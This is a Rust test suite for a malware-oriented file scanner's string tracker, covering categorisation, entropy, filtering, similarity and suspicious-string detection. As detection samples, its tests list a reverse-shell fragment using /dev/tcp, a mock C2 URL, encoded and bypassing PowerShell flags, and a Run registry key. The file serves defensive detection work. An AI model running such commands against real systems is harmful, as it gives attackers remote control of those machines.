use chrono::Utc;
use file_scanner::string_tracker::{
    StringContext, StringEntry, StringFilter, StringOccurrence, StringStatistics, StringTracker,
};
use std::collections::HashMap;
use std::sync::Arc;
use std::thread;

#[test]
fn test_string_tracker_initialization() {
    let tracker = StringTracker::new();
    let stats = tracker.get_statistics(None);

    assert_eq!(stats.total_unique_strings, 0);
    assert_eq!(stats.total_occurrences, 0);
    assert_eq!(stats.total_files_analyzed, 0);
    assert!(stats.most_common.is_empty());
    assert!(stats.suspicious_strings.is_empty());
    assert!(stats.high_entropy_strings.is_empty());
}

#[test]
fn test_basic_string_tracking() {
    let tracker = StringTracker::new();

    // Track a simple string
    let result = tracker.track_string(
        "hello world",
        "/path/to/file.txt",
        "hash123",
        "string_extractor",
        StringContext::FileString { offset: Some(0) },
    );

    assert!(result.is_ok());

    // Verify statistics
    let stats = tracker.get_statistics(None);
    assert_eq!(stats.total_unique_strings, 1);
    assert_eq!(stats.total_occurrences, 1);
    assert_eq!(stats.total_files_analyzed, 1);

    // Verify string details
    let details = tracker.get_string_details("hello world");
    assert!(details.is_some());

    let entry = details.unwrap();
    assert_eq!(entry.value, "hello world");
    assert_eq!(entry.total_occurrences, 1);
    assert_eq!(entry.unique_files.len(), 1);
    assert!(entry.unique_files.contains("hash123"));
    assert!(!entry.is_suspicious);
}

#[test]
fn test_multiple_occurrences_same_string() {
    let tracker = StringTracker::new();

    // Track same string from multiple files
    for i in 0..5 {
        tracker
            .track_string(
                "shared_string",
                &format!("/path/file{}.txt", i),
                &format!("hash{}", i),
                "scanner",
                StringContext::FileString {
                    offset: Some(i * 100),
                },
            )
            .unwrap();
    }

    let entry = tracker.get_string_details("shared_string").unwrap();
    assert_eq!(entry.total_occurrences, 5);
    assert_eq!(entry.unique_files.len(), 5);
    assert_eq!(entry.occurrences.len(), 5);

    // Track same string from same file multiple times
    for i in 0..3 {
        tracker
            .track_string(
                "duplicate_in_file",
                "/same/file.txt",
                "same_hash",
                "scanner",
                StringContext::FileString {
                    offset: Some(i * 50),
                },
            )
            .unwrap();
    }

    let entry = tracker.get_string_details("duplicate_in_file").unwrap();
    assert_eq!(entry.total_occurrences, 3);
    assert_eq!(entry.unique_files.len(), 1); // Only one unique file
}

#[test]
fn test_string_categorization_via_tracking() {
    let tracker = StringTracker::new();

    // Test categorization by tracking strings and checking their categories
    let test_cases = vec![
        ("https://example.com", "url"),
        ("http://test.org:8080/path", "url"),
        ("ftp://files.server.com", "url"),
        ("/usr/bin/python", "path"),
        ("C:\\Windows\\System32\\cmd.exe", "path"),
        ("/tmp/malware.bin", "path"),
        ("C:\\Temp\\payload.exe", "path"),
        ("/home/user/document.txt", "path"),
        ("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft", "registry"),
        ("HKEY_CURRENT_USER\\Environment", "registry"),
        ("kernel32.dll", "import"),
        ("libc.so", "import"),        // This ends with .so
        ("libc.so.6", "file_string"), // This has .6 extension, not .so
        ("libssl.dylib", "import"),
        ("cmd.exe /c dir", "command"),
        ("powershell -ExecutionPolicy Bypass", "command"),
        ("bash -c 'ls -la'", "command"),
    ];

    // Track strings using track_strings_from_results which internally categorizes them
    let strings: Vec<String> = test_cases.iter().map(|(s, _)| s.to_string()).collect();
    tracker
        .track_strings_from_results(&strings, "/test/file", "test_hash", "test_tool")
        .unwrap();

    // Verify each string was categorized correctly
    for (string, expected_category) in test_cases {
        let entry = tracker.get_string_details(string).unwrap();
        assert!(
            entry.categories.contains(expected_category),
            "String '{}' should have category '{}', but has {:?}",
            string,
            expected_category,
            entry.categories
        );
    }
}

#[test]
fn test_suspicious_string_detection() {
    let tracker = StringTracker::new();

    let suspicious_strings = vec![
        // Network indicators
        "https://malware-c2.com/beacon",
        "192.168.1.100",
        "10.0.0.1:4444",
        // Commands
        "cmd.exe",
        "powershell.exe -EncodedCommand",
        "bash -i >& /dev/tcp/10.0.0.1/8080",
        // Crypto/encoding
        "base64decode",
        "AES256",
        "SGVsbG8gV29ybGQhIFRoaXMgaXMgYSBiYXNlNjQgZW5jb2RlZCBzdHJpbmc=", // Base64
        // Suspicious paths
        "C:\\Windows\\System32\\svchost.exe",
        "/tmp/backdoor.sh",
        // Registry
        "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
        // Malware indicators
        "dropper.exe",
        "keylogger",
        "screenshot",
        "inject_payload",
        // High entropy strings (random-looking)
        "aB3xY9zK2mP5qW8eF7gH1iJ4kL6nO",
    ];

    for string in &suspicious_strings {
        tracker
            .track_string(
                string,
                "/suspicious/file.exe",
                "sus_hash",
                "scanner",
                StringContext::FileString { offset: None },
            )
            .unwrap();

        let entry = tracker.get_string_details(string).unwrap();
        assert!(
            entry.is_suspicious,
            "String '{}' should be marked as suspicious",
            string
        );
    }

    // Non-suspicious strings
    let normal_strings = vec![
        "Hello, World!",
        "This is a normal string",
        "version 1.0.0",
        "Copyright 2024",
    ];

    for string in &normal_strings {
        tracker
            .track_string(
                string,
                "/normal/file.txt",
                "normal_hash",
                "scanner",
                StringContext::FileString { offset: None },
            )
            .unwrap();

        let entry = tracker.get_string_details(string).unwrap();
        assert!(
            !entry.is_suspicious,
            "String '{}' should not be marked as suspicious",
            string
        );
    }
}

#[test]
fn test_entropy_based_suspicion() {
    let tracker = StringTracker::new();

    // Test that high entropy strings are marked as suspicious
    // We can't test entropy calculation directly, but we can verify that
    // strings with high entropy characteristics are marked suspicious
    let test_cases = vec![
        ("aaaaaaaaaa", false),  // Very low entropy (repeated chars) - not suspicious
        ("Hello World", false), // Normal text - not suspicious
        ("aB3xY9zK2mP5qW8eF7gH1iJ", true), // High entropy (random-like) - suspicious
        (
            "SGVsbG8gV29ybGQhIFRoaXMgaXMgYSBiYXNlNjQgZW5jb2RlZCBzdHJpbmc=",
            true,
        ), // Base64 - suspicious
    ];

    for (string, should_be_suspicious) in test_cases {
        tracker
            .track_string(
                string,
                "/test/file",
                "hash",
                "scanner",
                StringContext::FileString { offset: None },
            )
            .unwrap();

        let entry = tracker.get_string_details(string).unwrap();
        assert_eq!(
            entry.is_suspicious, should_be_suspicious,
            "String '{}' suspicious flag mismatch",
            string
        );
    }
}

#[test]
fn test_string_filtering() {
    let tracker = StringTracker::new();

    // Add various strings with different properties
    let strings = vec![
        ("short", 10, false),
        ("medium_length_string", 5, false),
        (
            "this_is_a_very_long_string_for_testing_length_filters",
            3,
            false,
        ),
        ("https://suspicious.com", 7, true),
        ("cmd.exe /c whoami", 2, true),
        ("normal_string_with_high_count", 20, false),
    ];

    for (string, count, _) in &strings {
        for i in 0..*count {
            tracker
                .track_string(
                    string,
                    &format!("/file{}.txt", i),
                    &format!("hash{}", i),
                    "scanner",
                    StringContext::FileString { offset: None },
                )
                .unwrap();
        }
    }

    // Test length filter
    let length_filter = StringFilter {
        min_length: Some(15),
        max_length: Some(30),
        min_occurrences: None,
        max_occurrences: None,
        categories: None,
        file_paths: None,
        file_hashes: None,
        suspicious_only: None,
        regex_pattern: None,
        min_entropy: None,
        max_entropy: None,
        date_range: None,
    };
    let stats = tracker.get_statistics(Some(&length_filter));
    // Strings that match: "medium_length_string" (20 chars), "https://suspicious.com" (22 chars),
    // "cmd.exe /c whoami" (17 chars), "normal_string_with_high_count" (29 chars)
    assert_eq!(stats.total_unique_strings, 4); // All strings between 15-30 chars

    // Test occurrence filter
    let occurrence_filter = StringFilter {
        min_occurrences: Some(5),
        max_occurrences: Some(10),
        min_length: None,
        max_length: None,
        categories: None,
        file_paths: None,
        file_hashes: None,
        suspicious_only: None,
        regex_pattern: None,
        min_entropy: None,
        max_entropy: None,
        date_range: None,
    };
    let stats = tracker.get_statistics(Some(&occurrence_filter));
    assert_eq!(stats.total_unique_strings, 3); // Strings with 5-10 occurrences

    // Test suspicious only filter
    let suspicious_filter = StringFilter {
        suspicious_only: Some(true),
        min_occurrences: None,
        max_occurrences: None,
        min_length: None,
        max_length: None,
        categories: None,
        file_paths: None,
        file_hashes: None,
        regex_pattern: None,
        min_entropy: None,
        max_entropy: None,
        date_range: None,
    };
    let stats = tracker.get_statistics(Some(&suspicious_filter));
    assert!(stats.total_unique_strings >= 2); // At least the suspicious strings

    // Test regex pattern filter
    let regex_filter = StringFilter {
        regex_pattern: Some(r"^https?://".to_string()),
        min_occurrences: None,
        max_occurrences: None,
        min_length: None,
        max_length: None,
        categories: None,
        file_paths: None,
        file_hashes: None,
        suspicious_only: None,
        min_entropy: None,
        max_entropy: None,
        date_range: None,
    };
    let stats = tracker.get_statistics(Some(&regex_filter));
    assert_eq!(stats.total_unique_strings, 1); // Only the URL

    // Test combined filters
    let combined_filter = StringFilter {
        min_length: Some(10),
        suspicious_only: Some(true),
        min_occurrences: Some(2),
        max_occurrences: None,
        max_length: None,
        categories: None,
        file_paths: None,
        file_hashes: None,
        regex_pattern: None,
        min_entropy: None,
        max_entropy: None,
        date_range: None,
    };
    let stats = tracker.get_statistics(Some(&combined_filter));
    assert!(stats.total_unique_strings >= 1);
}

#[test]
fn test_string_search() {
    let tracker = StringTracker::new();

    // Add test strings
    let test_strings = vec![
        "test_string_one",
        "test_string_two",
        "another_test_value",
        "different_content",
        "TEST_UPPERCASE",
    ];

    for string in &test_strings {
        tracker
            .track_string(
                string,
                "/test/file.txt",
                "hash",
                "scanner",
                StringContext::FileString { offset: None },
            )
            .unwrap();
    }

    // Test case-insensitive search
    let results = tracker.search_strings("test", 10);
    assert_eq!(results.len(), 4); // All strings containing "test" (case-insensitive)

    // Test partial match
    let results = tracker.search_strings("string", 10);
    assert_eq!(results.len(), 2); // test_string_one and test_string_two

    // Test limit
    let results = tracker.search_strings("test", 2);
    assert_eq!(results.len(), 2); // Limited to 2 results

    // Test no matches
    let results = tracker.search_strings("nonexistent", 10);
    assert_eq!(results.len(), 0);
}

#[test]
fn test_related_strings() {
    let tracker = StringTracker::new();

    // Create strings that should be related
    // Group 1: Same file, same category
    tracker
        .track_string(
            "kernel32.dll",
            "/malware.exe",
            "hash1",
            "imports",
            StringContext::Import {
                library: "kernel32.dll".to_string(),
            },
        )
        .unwrap();
    tracker
        .track_string(
            "ntdll.dll",
            "/malware.exe",
            "hash1",
            "imports",
            StringContext::Import {
                library: "ntdll.dll".to_string(),
            },
        )
        .unwrap();
    tracker
        .track_string(
            "advapi32.dll",
            "/malware.exe",
            "hash1",
            "imports",
            StringContext::Import {
                library: "advapi32.dll".to_string(),
            },
        )
        .unwrap();

    // Group 2: Different file, different category
    tracker
        .track_string(
            "unrelated_string",
            "/other.txt",
            "hash2",
            "strings",
            StringContext::FileString { offset: None },
        )
        .unwrap();

    // Test finding related strings
    let related = tracker.get_related_strings("kernel32.dll", 10);
    assert!(!related.is_empty());

    // Should find other DLLs from same file as highly related
    let related_names: Vec<String> = related.iter().map(|(s, _)| s.clone()).collect();
    assert!(related_names.contains(&"ntdll.dll".to_string()));
    assert!(related_names.contains(&"advapi32.dll".to_string()));

    // Similarity scores should be high for strings from same file
    for (_, score) in &related {
        assert!(*score > 0.3); // Minimum similarity threshold
    }
}

#[test]
fn test_statistics_generation() {
    let tracker = StringTracker::new();

    // Add variety of strings
    for i in 0..20 {
        let string = format!("string_{}", i);
        let count = (i % 5) + 1; // Variable occurrence counts

        for j in 0..count {
            tracker
                .track_string(
                    &string,
                    &format!("/file{}.txt", j),
                    &format!("hash{}", j),
                    "scanner",
                    StringContext::FileString { offset: None },
                )
                .unwrap();
        }
    }

    // Add some suspicious strings
    tracker
        .track_string(
            "https://malware.com",
            "/mal.exe",
            "mal_hash",
            "scanner",
            StringContext::Url {
                protocol: Some("https".to_string()),
            },
        )
        .unwrap();
    tracker
        .track_string(
            "cmd.exe",
            "/mal.exe",
            "mal_hash",
            "scanner",
            StringContext::Command {
                command_type: "shell".to_string(),
            },
        )
        .unwrap();

    let stats = tracker.get_statistics(None);

    // Verify statistics
    assert_eq!(stats.total_unique_strings, 22);
    assert!(stats.total_occurrences > 0);
    assert!(stats.total_files_analyzed > 0);
    assert!(!stats.most_common.is_empty());
    assert!(!stats.suspicious_strings.is_empty());
    assert!(!stats.category_distribution.is_empty());
    assert!(!stats.length_distribution.is_empty());

    // Check most common sorting
    for i in 1..stats.most_common.len() {
        assert!(stats.most_common[i - 1].1 >= stats.most_common[i].1);
    }
}

#[test]
fn test_track_strings_from_results() {
    let tracker = StringTracker::new();

    let strings = vec![
        "https://example.com/api".to_string(),
        "/usr/local/bin/app".to_string(),
        "kernel32.dll".to_string(),
        "HKEY_LOCAL_MACHINE\\SOFTWARE\\App".to_string(),
        "powershell.exe -Command".to_string(),
        "normal string".to_string(),
    ];

    let result = tracker.track_strings_from_results(
        &strings,
        "/analyzed/file.exe",
        "file_hash_123",
        "binary_analyzer",
    );

    assert!(result.is_ok());

    // Verify all strings were tracked
    let stats = tracker.get_statistics(None);
    assert_eq!(stats.total_unique_strings, 6);

    // Verify proper categorization
    let url_entry = tracker
        .get_string_details("https://example.com/api")
        .unwrap();
    assert!(url_entry.categories.contains("url"));

    let path_entry = tracker.get_string_details("/usr/local/bin/app").unwrap();
    assert!(path_entry.categories.contains("path"));

    let import_entry = tracker.get_string_details("kernel32.dll").unwrap();
    assert!(import_entry.categories.contains("import"));

    let registry_entry = tracker
        .get_string_details("HKEY_LOCAL_MACHINE\\SOFTWARE\\App")
        .unwrap();
    assert!(registry_entry.categories.contains("registry"));

    let command_entry = tracker
        .get_string_details("powershell.exe -Command")
        .unwrap();
    assert!(command_entry.categories.contains("command"));
}

#[test]
fn test_occurrence_limit() {
    let tracker = StringTracker::new();

    // Add more than 1000 occurrences to test the limit
    for i in 0..1500 {
        tracker
            .track_string(
                "frequently_occurring_string",
                &format!("/file{}.txt", i % 100), // Reuse some files
                &format!("hash{}", i % 100),
                "scanner",
                StringContext::FileString { offset: Some(i) },
            )
            .unwrap();
    }

    let entry = tracker
        .get_string_details("frequently_occurring_string")
        .unwrap();
    assert_eq!(entry.total_occurrences, 1500);
    assert!(entry.occurrences.len() <= 1000); // Should be limited to prevent memory issues
    assert!(entry.occurrences.len() > 900); // But should still have most recent ones
}

#[test]
fn test_concurrent_access() {
    let tracker = Arc::new(StringTracker::new());
    let mut handles = vec![];

    // Spawn multiple threads that add strings concurrently
    for thread_id in 0..10 {
        let tracker_clone = Arc::clone(&tracker);
        let handle = thread::spawn(move || {
            for i in 0..100 {
                let string = format!("thread_{}_string_{}", thread_id, i);
                tracker_clone
                    .track_string(
                        &string,
                        &format!("/thread{}/file{}.txt", thread_id, i),
                        &format!("hash_{}_{}", thread_id, i),
                        "concurrent_scanner",
                        StringContext::FileString { offset: Some(i) },
                    )
                    .unwrap();
            }
        });
        handles.push(handle);
    }

    // Wait for all threads to complete
    for handle in handles {
        handle.join().unwrap();
    }

    // Verify all strings were tracked
    let stats = tracker.get_statistics(None);
    assert_eq!(stats.total_unique_strings, 1000); // 10 threads * 100 strings each
}

#[test]
fn test_entropy_filtering() {
    let tracker = StringTracker::new();

    // Add strings with different entropy levels
    let strings = vec![
        ("aaaaaaa", "low_entropy"),        // Very low entropy
        ("hello123", "medium_entropy"),    // Medium entropy
        ("aB3xY9zK2mP5q", "high_entropy"), // High entropy
        ("SGVsbG8gV29ybGQh", "base64"),    // Base64 (high entropy)
    ];

    for (string, _) in &strings {
        tracker
            .track_string(
                string,
                "/test.txt",
                "hash",
                "scanner",
                StringContext::FileString { offset: None },
            )
            .unwrap();
    }

    // Filter for high entropy strings
    let high_entropy_filter = StringFilter {
        min_entropy: Some(3.5),
        min_occurrences: None,
        max_occurrences: None,
        min_length: None,
        max_length: None,
        categories: None,
        file_paths: None,
        file_hashes: None,
        suspicious_only: None,
        regex_pattern: None,
        max_entropy: None,
        date_range: None,
    };

    let stats = tracker.get_statistics(Some(&high_entropy_filter));
    assert!(stats.total_unique_strings >= 1); // At least one high entropy string

    // Filter for low entropy strings
    let low_entropy_filter = StringFilter {
        max_entropy: Some(2.0),
        min_occurrences: None,
        max_occurrences: None,
        min_length: None,
        max_length: None,
        categories: None,
        file_paths: None,
        file_hashes: None,
        suspicious_only: None,
        regex_pattern: None,
        min_entropy: None,
        date_range: None,
    };

    let stats = tracker.get_statistics(Some(&low_entropy_filter));
    assert!(stats.total_unique_strings >= 1); // At least the repeated 'a's
}

#[test]
fn test_category_filtering() {
    let tracker = StringTracker::new();

    // Add strings of different categories
    tracker
        .track_string(
            "https://example.com",
            "/file1",
            "hash1",
            "scanner",
            StringContext::Url {
                protocol: Some("https".to_string()),
            },
        )
        .unwrap();
    tracker
        .track_string(
            "/usr/bin/test",
            "/file2",
            "hash2",
            "scanner",
            StringContext::Path {
                path_type: "system".to_string(),
            },
        )
        .unwrap();
    tracker
        .track_string(
            "kernel32.dll",
            "/file3",
            "hash3",
            "scanner",
            StringContext::Import {
                library: "kernel32.dll".to_string(),
            },
        )
        .unwrap();
    tracker
        .track_string(
            "normal string",
            "/file4",
            "hash4",
            "scanner",
            StringContext::FileString { offset: None },
        )
        .unwrap();

    // Filter by specific categories
    let url_filter = StringFilter {
        categories: Some(vec!["url".to_string()]),
        min_occurrences: None,
        max_occurrences: None,
        min_length: None,
        max_length: None,
        file_paths: None,
        file_hashes: None,
        suspicious_only: None,
        regex_pattern: None,
        min_entropy: None,
        max_entropy: None,
        date_range: None,
    };

    let stats = tracker.get_statistics(Some(&url_filter));
    assert_eq!(stats.total_unique_strings, 1);

    // Filter by multiple categories
    let multi_filter = StringFilter {
        categories: Some(vec!["url".to_string(), "import".to_string()]),
        min_occurrences: None,
        max_occurrences: None,
        min_length: None,
        max_length: None,
        file_paths: None,
        file_hashes: None,
        suspicious_only: None,
        regex_pattern: None,
        min_entropy: None,
        max_entropy: None,
        date_range: None,
    };

    let stats = tracker.get_statistics(Some(&multi_filter));
    assert_eq!(stats.total_unique_strings, 2);
}

#[test]
fn test_file_hash_filtering() {
    let tracker = StringTracker::new();

    // Add strings from different files
    tracker
        .track_string(
            "string1",
            "/file1",
            "hash_a",
            "scanner",
            StringContext::FileString { offset: None },
        )
        .unwrap();
    tracker
        .track_string(
            "string2",
            "/file2",
            "hash_b",
            "scanner",
            StringContext::FileString { offset: None },
        )
        .unwrap();
    tracker
        .track_string(
            "string3",
            "/file3",
            "hash_c",
            "scanner",
            StringContext::FileString { offset: None },
        )
        .unwrap();

    // Also add string1 from another file
    tracker
        .track_string(
            "string1",
            "/file4",
            "hash_d",
            "scanner",
            StringContext::FileString { offset: None },
        )
        .unwrap();

    // Filter by specific file hash
    let hash_filter = StringFilter {
        file_hashes: Some(vec!["hash_a".to_string(), "hash_b".to_string()]),
        min_occurrences: None,
        max_occurrences: None,
        min_length: None,
        max_length: None,
        categories: None,
        file_paths: None,
        suspicious_only: None,
        regex_pattern: None,
        min_entropy: None,
        max_entropy: None,
        date_range: None,
    };

    let stats = tracker.get_statistics(Some(&hash_filter));
    assert_eq!(stats.total_unique_strings, 2); // string1 and string2
}

#[test]
fn test_serialization_roundtrip() {
    // Test StringEntry serialization
    let entry = StringEntry {
        value: "test_string".to_string(),
        first_seen: Utc::now(),
        last_seen: Utc::now(),
        total_occurrences: 5,
        unique_files: ["hash1", "hash2"].iter().map(|s| s.to_string()).collect(),
        occurrences: vec![StringOccurrence {
            file_path: "/test/file.txt".to_string(),
            file_hash: "hash1".to_string(),
            tool_name: "test_tool".to_string(),
            timestamp: Utc::now(),
            context: StringContext::Import {
                library: "test.dll".to_string(),
            },
        }],
        categories: ["import"].iter().map(|s| s.to_string()).collect(),
        is_suspicious: false,
        entropy: 3.14,
    };

    // JSON roundtrip
    let json = serde_json::to_string(&entry).unwrap();
    let deserialized: StringEntry = serde_json::from_str(&json).unwrap();
    assert_eq!(deserialized.value, entry.value);
    assert_eq!(deserialized.total_occurrences, entry.total_occurrences);
    assert_eq!(deserialized.entropy, entry.entropy);

    // Test StringStatistics serialization
    let mut category_dist = HashMap::new();
    category_dist.insert("file_string".to_string(), 10);
    category_dist.insert("url".to_string(), 5);

    let mut length_dist = HashMap::new();
    length_dist.insert("0-10".to_string(), 15);
    length_dist.insert("11-20".to_string(), 8);

    let stats = StringStatistics {
        total_unique_strings: 25,
        total_occurrences: 50,
        total_files_analyzed: 10,
        most_common: vec![("common".to_string(), 20), ("less_common".to_string(), 10)],
        suspicious_strings: vec!["malware.exe".to_string(), "cmd.exe".to_string()],
        high_entropy_strings: vec![("encoded".to_string(), 4.5), ("random".to_string(), 4.2)],
        category_distribution: category_dist,
        length_distribution: length_dist,
    };

    // JSON roundtrip
    let json = serde_json::to_string(&stats).unwrap();
    let deserialized: StringStatistics = serde_json::from_str(&json).unwrap();
    assert_eq!(
        deserialized.total_unique_strings,
        stats.total_unique_strings
    );
    assert_eq!(deserialized.suspicious_strings, stats.suspicious_strings);
    assert_eq!(
        deserialized.high_entropy_strings.len(),
        stats.high_entropy_strings.len()
    );
}

#[test]
fn test_edge_cases() {
    let tracker = StringTracker::new();

    // Empty string
    tracker
        .track_string(
            "",
            "/file",
            "hash",
            "scanner",
            StringContext::FileString { offset: None },
        )
        .unwrap();
    let entry = tracker.get_string_details("").unwrap();
    assert_eq!(entry.entropy, 0.0);

    // Very long string
    let long_string = "a".repeat(10000);
    tracker
        .track_string(
            &long_string,
            "/file",
            "hash",
            "scanner",
            StringContext::FileString { offset: None },
        )
        .unwrap();
    let entry = tracker.get_string_details(&long_string).unwrap();
    assert_eq!(entry.value.len(), 10000);

    // String with control characters
    let control_string = "test\x00\x01\x02\x03string";
    tracker
        .track_string(
            control_string,
            "/file",
            "hash",
            "scanner",
            StringContext::FileString { offset: None },
        )
        .unwrap();
    let entry = tracker.get_string_details(control_string).unwrap();
    assert!(entry.is_suspicious); // Should be marked suspicious due to control chars

    // Unicode string
    let unicode_string = "Hello 世界 🌍";
    tracker
        .track_string(
            unicode_string,
            "/file",
            "hash",
            "scanner",
            StringContext::FileString { offset: None },
        )
        .unwrap();
    let entry = tracker.get_string_details(unicode_string).unwrap();
    assert!(!entry.value.is_empty());
}

#[test]
fn test_clear_functionality() {
    let tracker = StringTracker::new();

    // Add some strings
    for i in 0..10 {
        tracker
            .track_string(
                &format!("string_{}", i),
                "/file",
                "hash",
                "scanner",
                StringContext::FileString { offset: None },
            )
            .unwrap();
    }

    // Verify strings exist
    let stats = tracker.get_statistics(None);
    assert_eq!(stats.total_unique_strings, 10);

    // Clear the tracker
    tracker.clear();

    // Verify all strings are gone
    let stats = tracker.get_statistics(None);
    assert_eq!(stats.total_unique_strings, 0);
    assert_eq!(stats.total_occurrences, 0);
}

#[test]
fn test_similarity_calculation() {
    let tracker = StringTracker::new();

    // Create a group of related strings (same file, similar properties)
    let file1_strings = vec!["CreateFileA", "WriteFile", "CloseHandle"];
    for s in &file1_strings {
        tracker
            .track_string(
                s,
                "/malware1.exe",
                "hash1",
                "imports",
                StringContext::Import {
                    library: "kernel32.dll".to_string(),
                },
            )
            .unwrap();
    }

    // Create another group (different file, different category)
    let file2_strings = vec!["printf", "malloc", "free"];
    for s in &file2_strings {
        tracker
            .track_string(
                s,
                "/program2.exe",
                "hash2",
                "imports",
                StringContext::Import {
                    library: "libc.so".to_string(),
                },
            )
            .unwrap();
    }

    // Strings from same file should have higher similarity
    let related = tracker.get_related_strings("CreateFileA", 10);
    let related_map: HashMap<String, f64> = related.into_iter().collect();

    // Should find WriteFile and CloseHandle as highly related
    assert!(related_map.contains_key("WriteFile"));
    assert!(related_map.contains_key("CloseHandle"));

    // Similarity to strings from same file should be higher than to strings from different files
    if let (Some(&same_file_sim), Some(&diff_file_sim)) =
        (related_map.get("WriteFile"), related_map.get("printf"))
    {
        assert!(same_file_sim > diff_file_sim);
    }
}
